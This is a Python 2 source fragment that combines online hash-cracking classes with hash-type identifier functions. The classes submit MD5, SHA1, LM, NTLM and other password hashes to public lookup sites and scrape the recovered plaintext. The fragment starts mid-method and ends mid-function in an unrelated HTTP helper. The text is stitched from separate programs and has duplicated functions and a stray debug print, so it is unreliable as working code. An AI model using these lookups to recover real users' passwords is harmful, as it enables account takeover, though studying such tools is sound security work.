		if not self.isSupported (alg):
			return None
		
		hash2 = None
		if alg in [LM, NTLM] and ':' in hashvalue:
			if alg == LM:
				hash2 = hashvalue.split(':')[0]
			else:
				hash2 = hashvalue.split(':')[1]
		else:
			hash2 = hashvalue
		
		
		
		url = "http://cracker.fox21.at/api.php?a=check&h=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		xml = None
		if response:
			try:
				doc = parseDoc ( response.read() )
			except:
				print "INFO: You need libxml2 to use this plugin."
				return None
		else:
			return None
		
		result = doc.xpathEval("//hash/@plaintext")
		
		if result:
			return result[0].content
		else:
			return None

def SHA1MaNGOS():
    hs='a2c0cdb6d1ebd1b9f85c6e25e0f8732e88f02f96'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109220")
def SHA1MaNGOS2():
    hs='644a29679136e09d0bd99dfd9e8c5be84108b5fd'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109240")
def Tiger160():
    hs='c086184486ec6388ff81ec9f235287270429b225'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109080")
def Tiger160HMAC():
    hs='6603161719da5e56e1866e4f61f79496334e6a10'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109160")
def sha1passsalt():
    hs='f006a1863663c21c541c8d600355abfeeaadb5e4'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109260")
def sha1saltpass():
    hs='299c3d65a0dcab1fc38421783d64d0ecf4113448'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109280")
def sha1saltmd5pass():
    hs='860465ede0625deebb4fbbedcb0db9dc65faec30'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109300")
def sha1saltmd5passsalt():
    hs='6716d047c98c25a9c2cc54ee6134c73e6315a0ff'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109320")
def sha1saltsha1pass():
    hs='58714327f9407097c64032a2fd5bff3a260cb85f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109340")
def sha1saltsha1saltsha1pass():
    hs='cc600a2903130c945aa178396910135cc7f93c63'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109360")

			
class NICENAMECREW:
	
	name = 		"nicenamecrew"
	url = 		"http://crackfoo.nicenamecrew.com"
	supported_algorithm = [MD5, SHA1, LM]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		hash2 = None
		if alg in [LM] and ':' in hashvalue:
			hash2 = hashvalue.split(':')[0]
		else:
			hash2 = hashvalue
			
		
		url = "http://crackfoo.nicenamecrew.com/?t=%s" % (alg)
		
		
		params = { "q" : hash2,
			   "sa" : "Crack" }
			   
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'The decrypted version of [^\s]* is:<br><strong>[^<]*</strong>', html)
		
		if match:
			return match.group().split('strong>')[1][:-2].strip()
		else:
			return None


def MD5APR():
    hs='$apr1$qAUKoKlG$3LuCncByN76eLxZAh/Ldr1'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash[0:4].find('$apr')==0:
        jerar.append("108020")

def Haval160():
    hs='a106e921284dd69dad06192a4411ec32fce83dbb'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109100")
def Haval160HMAC():
    hs='29206f83edc1d6c3f680ff11276ec20642881243'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109200")
def MySQL5():
    hs='9bb2fb57063821c762cc009f7584ddae9da431ff'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109040")
def MySQL160bit():
    hs='*2470c0c06dee42fd1618bb99005adca2ec9d1e19'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:1].find('*')==0:
        jerar.append("109060")
def RipeMD160():
    hs='dc65552812c66997ea7320ddfb51f5625d74721b'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109120")
def RipeMD160HMAC():
    hs='ca28af47653b4f21e96c1235984cb50229331359'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109180")
def SHA1():
    hs='4a1d4dbc1e193ec3ab2e9213876ceb8f4db72333'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109020")
def SHA1HMAC():
    hs='6f5daac3fee96ba1382a09b1ba326ca73dccf9e7'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("109140")


class JOOMLAAA:
	
	name = 		"joomlaaa"
	url = 		"http://joomlaaa.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://joomlaaa.com/component/option,com_md5/Itemid,31/"
		
		
		params = { "md5" : hashvalue,
			   "decode" : "Submit" }
			   
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r"<td class='title1'>not available</td>", html)
		
		if not match:
			match2 = findall (r"<td class='title1'>[^<]*</td>", html)
			return match2[1].split('>')[1][:-4]
		else:
			return None



class MD5_LOOKUP:
	
	name = 		"md5-lookup"
	url = 		"http://md5-lookup.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5-lookup.com/livesearch.php?q=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<td width="250">[^<]*</td>', html)
		
		if match:
			return match.group().split('>')[1][:-4]
		else:
			return None


def md5md5md5md5md5pass():
    hs='4548d2c062933dff53928fd4ae427fc0'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106660")
def md5sha1pass():
    hs='cb4ebaaedfd536d965c452d9569a6b1e'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106680")
def md5sha1md5pass():
    hs='099b8a59795e07c334a696a10c0ebce0'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106700")
def md5sha1md5sha1pass():
    hs='06e4af76833da7cc138d90602ef80070'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106720")
def md5strtouppermd5pass():
    hs='519de146f1a658ab5e5e2aa9b7d2eec8'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106740")

def LineageIIC4():
    hs='0x49a57f66bd3d5ba6abda5579c264a0e4'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True and hash[0:2].find('0x')==0:
        jerar.append("107080")
def MD5phpBB3():
    hs='$H$9kyOtE8CDqMJ44yfn9PFz2E.L2oVzL1'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$H$')==0:
        jerar.append("107040")
def MD5Unix():
    hs='$1$cTuJH0Ju$1J8rI.mJReeMvpKUZbSlY/'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$1$')==0:
        jerar.append("107060")
def MD5Wordpress():
    hs='$P$BiTOhOj3ukMgCci2juN0HRbCdDRqeh.'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$P$')==0:
        jerar.append("107020")



class SHA1_LOOKUP:
	
	name = 		"sha1-lookup"
	url = 		"http://sha1-lookup.com"
	supported_algorithm = [SHA1]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://sha1-lookup.com/livesearch.php?q=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<td width="250">[^<]*</td>', html)
		
		if match:
			return match.group().split('>')[1][:-4]
		else:
			return None


class SHA256_LOOKUP:
	
	name = 		"sha256-lookup"
	url = 		"http://sha-256.sha1-lookup.com"
	supported_algorithm = [SHA256]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://sha-256.sha1-lookup.com/livesearch.php?q=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<td width="250">[^<]*</td>', html)
		
		if match:
			return match.group().split('>')[1][:-4]
		else:
			return None



class RIPEMD160_LOOKUP:
	
	name = 		"ripemd-lookup"
	url = 		"http://www.ripemd-lookup.com"
	supported_algorithm = [RIPEMD]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.ripemd-lookup.com/livesearch.php?q=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<td width="250">[^<]*</td>', html)
		
		if match:
			return match.group().split('>')[1][:-4]
		else:
			return None



class MD5_COM_CN:
	
	name = 		"md5.com.cn"
	url = 		"http://md5.com.cn"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.com.cn/md5reverse"
		
		
		params = { "md" : hashvalue,
			   "submit" : "MD5 Crack" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<b style="color:red;">[^<]*</b><br/><span', html)
		
		if match:
			return match.group().split('>')[1][:-3]
		else:
			return None




def md5md5pass():
    hs='a96103d267d024583d5565436e52dfb3'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106500")
def md5md5passsalt():
    hs='5848c73c2482d3c2c7b6af134ed8dd89'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106520")
def md5md5passmd5salt():
    hs='8dc71ef37197b2edba02d48c30217b32'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106540")
def md5md5saltpass():
    hs='9032fabd905e273b9ceb1e124631bd67'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106560")
def md5md5saltmd5pass():
    hs='8966f37dbb4aca377a71a9d3d09cd1ac'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106580")
def md5md5usernamepasssalt():
    hs='4319a3befce729b34c3105dbc29d0c40'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106600")
def md5md5md5pass():
    hs='ea086739755920e732d0f4d8c1b6ad8d'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106620")
def md5md5md5md5pass():
    hs='02528c1f2ed8ac7d83fe76f3cf1c133f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106640")

			
class DIGITALSUN:
	
	name = 		"digitalsun.pl"
	url = 		"http://md5.digitalsun.pl"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.digitalsun.pl/"
		
		
		params = { "hash" : hashvalue }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<b>[^<]*</b> == [^<]*<br>\s*<br>', html)
		
		if match:
			return match.group().split('b>')[1][:-2]
		else:
			return None



class DRASEN:
	
	name = 		"drasen.net"
	url = 		"http://md5.drasen.net"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.drasen.net/search.php?query=%s" % (hashvalue)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'Hash: [^<]*<br />Plain: [^<]*<br />', html)
		
		if match:
			return match.group().split('<br />')[1][7:]
		else:
			return None


def md5saltpassusername():
    hs='9ae20f88189f6e3a62711608ddb6f5fd'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106320")
def md5saltmd5pass():
    hs='aca2a052962b2564027ee62933d2382f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106340")
def md5saltmd5passsalt():
    hs='de0237dc03a8efdf6552fbe7788b2fdd'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106360")
def md5saltmd5passsalt():
    hs='5b8b12ca69d3e7b2a3e2308e7bef3e6f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106380")
def md5saltmd5saltpass():
    hs='d8f3b3f004d387086aae24326b575b23'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106400")
def md5saltmd5md5passsalt():
    hs='81f181454e23319779b03d74d062b1a2'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106420")
def md5username0pass():
    hs='e44a60f8f2106492ae16581c91edb3ba'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106440")
def md5usernameLFpass():
    hs='654741780db415732eaee12b1b909119'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106460")
def md5usernamemd5passsalt():
    hs='954ac5505fd1843bbb97d1b2cda0b98f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106480")


class MYINFOSEC:
	
	name = 		"myinfosec"
	url = 		"http://md5.myinfosec.net"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.myinfosec.net/md5.php"
		
		
		params = { "md5hash" : hashvalue }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<center></center>[^<]*<font color=green>[^<]*</font><br></center>', html)
		
		if match:
			return match.group().split('>')[3][:-6]
		else:
			return None



class MD5_NET:
	
	name = 		"md5.net"
	url = 		"http://md5.net"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://www.md5.net/cracker.php"
		
		
		params = { "hash" : hashvalue }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<input type="text" id="hash" size="32" value="[^"]*"/>', html)
		
		if match:
			return match.group().split('"')[7]
		else:
			return None




class NOISETTE:
	
	name = 		"noisette.ch"
	url = 		"http://md5.noisette.ch"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5.noisette.ch/index.php"
		
		
		params = { "hash" : hashvalue }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<p>String to hash : <input name="text" value="[^"]+"/>', html)
		
		if match:
			return match.group().split('"')[3]
		else:
			return None




class MD5HOOD:
	
	name = 		"md5hood"
	url = 		"http://md5hood.com"
	supported_algorithm = [MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://md5hood.com/index.php/cracker/crack"
		
		
		params = { "md5" : hashvalue,
			   "submit" : "Go" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<div class="result_true">[^<]*</div>', html)
		
		if match:
			return match.group().split('>')[1][:-5]
		else:
			return None



class STRINGFUNCTION:
	
	name = 		"stringfunction"
	url = 		"http://www.stringfunction.com"
	supported_algorithm = [MD5, SHA1]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = ""
		if alg == MD5:
			url = "http://www.stringfunction.com/md5-decrypter.html"
		else:
			url = "http://www.stringfunction.com/sha1-decrypter.html"
		
		
		params = { "string" : hashvalue,
			   "submit" : "Decrypt",
			   "result" : "" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<textarea class="textarea-input-tool-b" rows="10" cols="50" name="result"[^>]*>[^<]+</textarea>', html)
		
		if match:
			return match.group().split('>')[1][:-10]
		else:
			return None





class XANADREL:
	
	name = 		"99k.org"
	url = 		"http://xanadrel.99k.org"
	supported_algorithm = [MD4, MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://xanadrel.99k.org/hashes/index.php?k=search"
		
		
		params = { "hash" : hashvalue,
			   "search" : "ok" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<p>Hash : [^<]*<br />Type : [^<]*<br />Plain : "[^"]*"<br />', html)
		
		if match:
			return match.group().split('"')[1]
		else:
			return None


def Tiger128():
    hs='c086184486ec6388ff81ec9f23528727'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106220")
def Tiger128HMAC():
    hs='c87032009e7c4b2ea27eb6f99723454b'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106225")
def md5passsalt():
    hs='5634cc3b922578434d6e9342ff5913f7'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106240")
def md5saltmd5pass():
    hs='245c5763b95ba42d4b02d44bbcd916f1'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106260")
def md5saltpass():
    hs='22cc5ce1a1ef747cd3fa06106c148dfa'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106280")
def md5saltpasssalt():
    hs='469e9cdcaff745460595a7a386c4db0c'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106300")


class SANS:
	
	name = 		"sans"
	url = 		"http://isc.sans.edu"
	supported_algorithm = [MD5, SHA1]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://isc.sans.edu/tools/reversehash.html"
		
		headers = { "User-Agent" : USER_AGENTS[randint(0, len(USER_AGENTS))-1] }
		
		
		response = do_HTTP_request ( url, httpheaders=headers )
		html = None
		if response:
			html = response.read()
		else:
			return None
		match = search (r'<input type="hidden" name="token" value="[^"]*" />', html)
		token = ""
		if match:
			token = match.group().split('"')[5]
		else:
			return None
		
		params = { "token" : token,
			   "text" : hashvalue,
			   "word" : "",
			   "submit" : "Submit" }
		
		
		headers["Referer"] = "http://isc.sans.edu/tools/reversehash.html"
		
		
		response = do_HTTP_request ( url, params, headers )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'... hash [^\s]* = [^\s]*\s*</p><br />', html)
		
		if match:
			print "hola mundo"
			return match.group().split('=')[1][:-10].strip()
		else:
			return None



class BOKEHMAN:
	
	name = 		"bokehman"
	url = 		"http://bokehman.com"
	supported_algorithm = [MD4, MD5]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False



	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
		
		
		url = "http://bokehman.com/cracker/"
		
		
		response = do_HTTP_request ( url )
		html = None
		if response:
			html = response.read()
		else:
			return None
		match = search (r'<input type="hidden" name="PHPSESSID" id="PHPSESSID" value="[^"]*" />', html)
		phpsessnid = ""
		if match:
			phpsessnid = match.group().split('"')[7]
		else:
			return None
		match = search (r'<input type="hidden" name="key" id="key" value="[^"]*" />', html)
		key = ""
		if match:
			key = match.group().split('"')[7]
		else:
			return None
		
		params = { "md5" : hashvalue,
			   "PHPSESSID" : phpsessnid,
			   "key" : key,
			   "crack" : "Try to crack it" }
		
		
		response = do_HTTP_request ( url, params )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<tr><td>[^<]*</td><td>[^<]*</td><td>[^s]*seconds</td></tr>', html)
		
		if match:
			return match.group().split('td>')[1][:-2]
		else:
			return None



class GOOG_LI:

	name = 		"goog.li"
	url = 		"http://goog.li"
	supported_algorithm = [MD5, MYSQL, SHA1, SHA224, SHA384, SHA256, SHA512, RIPEMD, NTLM, GOST, WHIRLPOOL, LDAP_MD5, LDAP_SHA1]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
			
		hash2 = None
		if alg in [NTLM] and ':' in hashvalue:
			hash2 = hashvalue.split(':')[1]
		else:
			hash2 = hashvalue
		
		
		if alg == MYSQL and hash2[0] != '*':
			hash2 = '*' + hash2
		
		
		url = "http://goog.li/?q=%s" % (hash2)
		
		
		response = do_HTTP_request ( url )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<br />cleartext[^:]*: [^<]*<br />', html)
		
		if match:
			return match.group().split(':')[1].strip()[:-6]
		else:
			return None



class WHREPORITORY:

	name = 		"Windows Hashes Repository"
	url = 		"http://nediam.com.mx"
	supported_algorithm = [LM, NTLM]
	
	def isSupported (self, alg):
		
		
		
		if alg in self.supported_algorithm:
			return True
		else:
			return False


	def crack (self, hashvalue, alg):
		
		
		
		
		
		if not self.isSupported (alg):
			return None
			
		hash2 = None
		if ':' in hashvalue:
			if alg == LM:
				hash2 = hashvalue.split(':')[0]
			else:
				hash2 = hashvalue.split(':')[1]
		else:
			hash2 = hashvalue
		
		
		url = ""
		params = None
		headers = None
		if alg == LM:
			url = "http://nediam.com.mx/winhashes/search_lm_hash.php"
			params = { "lm" : hash2,
				"btn_go" : "Search" }
			headers = { "Referer" : "http://nediam.com.mx/winhashes/search_lm_hash.php" }
		else:
			url = "http://nediam.com.mx/winhashes/search_nt_hash.php"
			params = { "nt" : hash2,
				"btn_go" : "Search" }
			headers = { "Referer" : "http://nediam.com.mx/winhashes/search_nt_hash.php" }
		
		
		response = do_HTTP_request ( url, params, headers )
		
		
		html = None
		if response:
			html = response.read()
		else:
			return None
		
		match = search (r'<tr><td align="right">PASSWORD</td><td>[^<]*</td></tr>', html)
		
		if match:
			return match.group().split(':')[1]
		else:
			return None



def GHash323():
    hs='80000000'
    if len(hash)==len(hs) and hash.isdigit()==True and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("103040")
def GHash325():
    hs='85318985'
    if len(hash)==len(hs) and hash.isdigit()==True and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("103020")

def DESUnix():
    hs='ZiY8YtDKXJwYQ'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False:
        jerar.append("104020")

def MD5Half():
    hs='ae11fd697ec92c7c'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("105060")
def MD5Middle():
    hs='7ec92c7c98de3fac'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("105040")
def MySQL():
    hs='63cea4673fd25f46'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("105020")

def DomainCachedCredentials():
    hs='f42005ec1afe77967cbc83dce1b4d714'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106025")
def Haval128():
    hs='d6e3ec49aa0f138a619f27609022df10'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106160")
def Haval128HMAC():
    hs='3ce8b0ffd75bc240fc7d967729cd6637'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106165")
def MD2():
    hs='08bbef4754d98806c373f2cd7d9a43c4'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106060")
def MD2HMAC():
    hs='4b61b72ead2b0eb0fa3b8a56556a6dca'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106120")
def MD4():
    hs='a2acde400e61410e79dacbdfc3413151'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106040")
def MD4HMAC():
    hs='6be20b66f2211fe937294c1c95d1cd4f'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106100")
def MD5():
    hs='ae11fd697ec92c7c98de3fac23aba525'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106020")
def MD5HMAC():
    hs='d57e43d2c7e397bf788f66541d6fdef9'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106080")
def MD5HMACWordpress():
    hs='3f47886719268dfa83468630948228f6'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106140")
def NTLM():
    hs='cc348bace876ea440a28ddaeb9fd3550'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106029")
def RAdminv2x():
    hs='baea31c728cbf0cd548476aa687add4b'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106027")
def RipeMD128():
    hs='4985351cd74aff0abc5a75a0c8a54115'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106180")
def RipeMD128HMAC():
    hs='ae1995b931cf4cbcf1ac6fbf1a83d1d3'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106185")
def SNEFRU128():
    hs='4fb58702b617ac4f7ca87ec77b93da8a'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106200")
def SNEFRU128HMAC():
    hs='59b2b9dcc7a9a7d089cecf1b83520350'
    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        jerar.append("106205")


def GetThatShit(head_URL):
        source = ""
        global gets;global proxy_num
        head_URL = head_URL.replace("+",arg_eva)
        request_web = urllib2.Request(head_URL)
        request_web.add_header('User-Agent',agent)
        while len(source) < 1:
